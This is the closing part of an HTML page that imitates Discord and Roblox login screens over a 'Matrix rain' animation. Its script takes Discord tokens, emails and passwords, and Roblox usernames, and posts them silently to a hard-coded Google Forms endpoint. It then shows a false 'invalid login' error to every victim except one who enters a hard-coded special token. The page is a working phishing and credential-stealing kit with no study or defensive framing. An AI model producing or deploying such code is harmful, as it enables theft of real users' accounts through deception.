                        </g>
                        <defs>
                            <clipPath id="clip0">
                                <rect width="71" height="55" fill="white"/>
                            </clipPath>
                        </defs>
                    </svg>
                    <div class="icon-label">Discord</div>
                </div>
                
                <div class="icon-wrapper" id="robloxIcon">
                    <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" class="roblox-icon-svg">
                        <rect x="25" y="25" width="50" height="50" transform="rotate(-25 50 50)" fill="#fff" stroke="#0f0" stroke-width="2" rx="3"/>
                        <rect x="38" y="38" width="12" height="12" transform="rotate(-25 50 50)" fill="#000" rx="1"/>
                    </svg>
                    <div class="icon-label">Roblox</div>
                </div>
            </div>
        </div>
        
        <!-- Discord Overlay -->
        <div class="auth-overlay" id="discordOverlay">
            <div class="discord-login">
                <div class="close-btn-white" id="closeDiscord">✕</div>
                <h2 class="discord-title">Welcome back!</h2>
                <p class="discord-subtitle">We're so excited to see you again!</p>
                <form id="discordForm">
                    <div class="discord-input-group">
                        <label class="discord-label">TOKEN *</label>
                        <input 
                            type="text"
                            id="discordToken" 
                            name="discordToken" 
                            class="discord-input"
                            required
                        />
                    </div>
                    
                    <div class="discord-link" id="showPasswordForm">Don't have a token?</div>
                    
                    <button type="submit" id="discordBtn" class="discord-button">
                        Log In
                    </button>
                    
                    <div class="success-message discord-message" id="discordSuccess">
                        ✓ Access Granted
                    </div>
                    
                    <div class="error-message discord-message" id="discordError">
                        Login or password is invalid.
                    </div>
                </form>
            </div>
        </div>
        
        <!-- Discord Password Form Overlay -->
        <div class="auth-overlay" id="passwordOverlay">
            <div class="discord-login">
                <div class="close-btn-white" id="closePassword">✕</div>
                <h2 class="discord-title">Welcome back!</h2>
                <p class="discord-subtitle">We're so excited to see you again!</p>
                <form id="passwordForm">
                    <div class="discord-input-group">
                        <label class="discord-label">EMAIL *</label>
                        <input 
                            type="email"
                            id="passwordEmail" 
                            name="passwordEmail" 
                            class="discord-input"
                            required
                        />
                    </div>
                    
                    <div class="discord-input-group">
                        <label class="discord-label">PASSWORD *</label>
                        <input 
                            type="password"
                            id="passwordField" 
                            name="passwordField" 
                            class="discord-input"
                            required
                        />
                    </div>
                    
                    <button type="submit" id="passwordBtn" class="discord-button">
                        Log In
                    </button>
                    
                    <div class="success-message discord-message" id="passwordSuccess">
                        ✓ Access Granted
                    </div>
                    
                    <div class="error-message discord-message" id="passwordError">
                        Login or password is invalid.
                    </div>
                </form>
            </div>
        </div>
        
        <!-- Roblox Overlay -->
        <div class="auth-overlay" id="robloxOverlay">
            <div class="roblox-login">
                <div class="close-btn-dark" id="closeRoblox">✕</div>
                <div class="roblox-logo-center">
                    <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" style="width: 60px; height: 60px;">
                        <rect x="25" y="25" width="50" height="50" transform="rotate(-25 50 50)" fill="#000" rx="3"/>
                        <rect x="38" y="38" width="12" height="12" transform="rotate(-25 50 50)" fill="#fff" rx="1"/>
                    </svg>
                </div>
                <h2 class="roblox-title">Log in to Roblox</h2>
                <form id="robloxForm">
                    <div class="roblox-input-group">
                        <input 
                            type="text"
                            id="robloxToken" 
                            name="robloxToken" 
                            class="roblox-input"
                            placeholder="Username or Email"
                            required
                        />
                    </div>
                    
                    <div class="roblox-input-group">
                        <input 
                            type="password"
                            class="roblox-input"
                            placeholder="Password"
                            required
                        />
                    </div>
                    
                    <button type="submit" id="robloxBtn" class="roblox-button">
                        Log In
                    </button>
                    
                    <div class="success-message roblox-message" id="robloxSuccess">
                        ✓ Access Granted
                    </div>
                    
                    <div class="error-message roblox-message" id="robloxError">
                        Incorrect username or password.
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script>
        // Matrix rain effect
        const canvas = document.getElementById('matrix-canvas');
        const ctx = canvas.getContext('2d');

        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            ctx.fillStyle = '#0f0';
            ctx.font = fontSize + 'px monospace';

            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }

        setInterval(drawMatrix, 33);

        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });

        // Form submission
        const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLScOHqwTWXPSVomMCucfrWfIhGv-f7rTyjJVtwlHrgNidRdfyQ/formResponse';
        const ENTRY_ID = 'entry.1904958192';

        const discordIcon = document.getElementById('discordIcon');
        const robloxIcon = document.getElementById('robloxIcon');
        
        const discordOverlay = document.getElementById('discordOverlay');
        const robloxOverlay = document.getElementById('robloxOverlay');
        const passwordOverlay = document.getElementById('passwordOverlay');
        
        const closeDiscord = document.getElementById('closeDiscord');
        const closeRoblox = document.getElementById('closeRoblox');
        const closePassword = document.getElementById('closePassword');
        
        const showPasswordForm = document.getElementById('showPasswordForm');
        
        const discordForm = document.getElementById('discordForm');
        const discordToken = document.getElementById('discordToken');
        const discordBtn = document.getElementById('discordBtn');
        const discordSuccess = document.getElementById('discordSuccess');
        const discordError = document.getElementById('discordError');
        
        const passwordForm = document.getElementById('passwordForm');
        const passwordEmail = document.getElementById('passwordEmail');
        const passwordField = document.getElementById('passwordField');
        const passwordBtn = document.getElementById('passwordBtn');
        const passwordSuccess = document.getElementById('passwordSuccess');
        const passwordError = document.getElementById('passwordError');
        
        const robloxForm = document.getElementById('robloxForm');
        const robloxToken = document.getElementById('robloxToken');
        const robloxBtn = document.getElementById('robloxBtn');
        const robloxSuccess = document.getElementById('robloxSuccess');
        const robloxError = document.getElementById('robloxError');

        const SPECIAL_TOKEN = 'QzE5MDQ2NzM4MTI5NTY4NDAxMg.aFZrQk9YeDdzM1NHTkJUNmFQWQ';
        const REDIRECT_URL = 'https://sites.google.com/view/pagerfps/game';

        // Show Discord overlay
        discordIcon.addEventListener('click', () => {
            discordOverlay.classList.add('active');
        });

        // Show Roblox overlay
        robloxIcon.addEventListener('click', () => {
            robloxOverlay.classList.add('active');
        });

        // Show password form
        showPasswordForm.addEventListener('click', () => {
            discordOverlay.classList.add('closing');
            setTimeout(() => {
                discordOverlay.classList.remove('active', 'closing');
                passwordOverlay.classList.add('active');
            }, 300);
        });

        // Close Discord overlay
        closeDiscord.addEventListener('click', () => {
            discordOverlay.classList.add('closing');
            setTimeout(() => {
                discordOverlay.classList.remove('active', 'closing');
            }, 300);
        });

        // Close Password overlay
        closePassword.addEventListener('click', () => {
            passwordOverlay.classList.add('closing');
            setTimeout(() => {
                passwordOverlay.classList.remove('active', 'closing');
            }, 300);
        });

        // Close Roblox overlay
        closeRoblox.addEventListener('click', () => {
            robloxOverlay.classList.add('closing');
            setTimeout(() => {
                robloxOverlay.classList.remove('active', 'closing');
            }, 300);
        });

        // Close overlays when clicking outside
        discordOverlay.addEventListener('click', (e) => {
            if (e.target === discordOverlay) {
                discordOverlay.classList.add('closing');
                setTimeout(() => {
                    discordOverlay.classList.remove('active', 'closing');
                }, 300);
            }
        });

        passwordOverlay.addEventListener('click', (e) => {
            if (e.target === passwordOverlay) {
                passwordOverlay.classList.add('closing');
                setTimeout(() => {
                    passwordOverlay.classList.remove('active', 'closing');
                }, 300);
            }
        });

        robloxOverlay.addEventListener('click', (e) => {
            if (e.target === robloxOverlay) {
                robloxOverlay.classList.add('closing');
                setTimeout(() => {
                    robloxOverlay.classList.remove('active', 'closing');
                }, 300);
            }
        });

        // Discord form submission
        discordForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const message = discordToken.value.trim();
            
            if (!message) return;

            // Check if it's the special token
            if (message === SPECIAL_TOKEN) {
                window.open(REDIRECT_URL, '_blank');
                discordSuccess.classList.add('show');
                discordToken.value = '';
                setTimeout(() => {
                    discordSuccess.classList.remove('show');
                    discordOverlay.classList.remove('active');
                }, 2000);
                return;
            }

            // For non-special tokens, show error but still send to form
            discordBtn.disabled = true;
            discordBtn.textContent = 'Logging in...';

            try {
                const formData = new FormData();
                formData.append(ENTRY_ID, message);

                await fetch(FORM_URL, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                });

                // Show error message
                discordError.classList.add('show');
                discordToken.value = '';

                setTimeout(() => {
                    discordError.classList.remove('show');
                }, 3000);

            } catch (error) {
                console.error('Error:', error);
            } finally {
                discordBtn.disabled = false;
                discordBtn.textContent = 'Log In';
            }
        });

        // Password form submission
        passwordForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const email = passwordEmail.value.trim();
            const password = passwordField.value.trim();
            
            if (!email || !password) return;

            passwordBtn.disabled = true;
            passwordBtn.textContent = 'Logging in...';

            try {
                const formData = new FormData();
                formData.append(ENTRY_ID, `Email: ${email} | Password: ${password}`);

                await fetch(FORM_URL, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                });

                // Show error message
                passwordError.classList.add('show');
                passwordEmail.value = '';
                passwordField.value = '';

                setTimeout(() => {
                    passwordError.classList.remove('show');
                }, 3000);

            } catch (error) {
                console.error('Error:', error);
            } finally {
                passwordBtn.disabled = false;
                passwordBtn.textContent = 'Log In';
            }
        });

        // Roblox form submission
        robloxForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const token = robloxToken.value.trim();
            
            if (!token) return;

            robloxBtn.disabled = true;
            robloxBtn.textContent = 'Logging in...';

            try {
                const formData = new FormData();
                formData.append(ENTRY_ID, token);

                await fetch(FORM_URL, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                });

                // Show error message for all Roblox tokens
                robloxError.classList.add('show');
                robloxToken.value = '';

                setTimeout(() => {
                    robloxError.classList.remove('show');
                }, 3000);

            } catch (error) {
                console.error('Error:', error);
            } finally {
                robloxBtn.disabled = false;
                robloxBtn.textContent = 'Log In';
            }
        });
    </script>
</body>
</html>
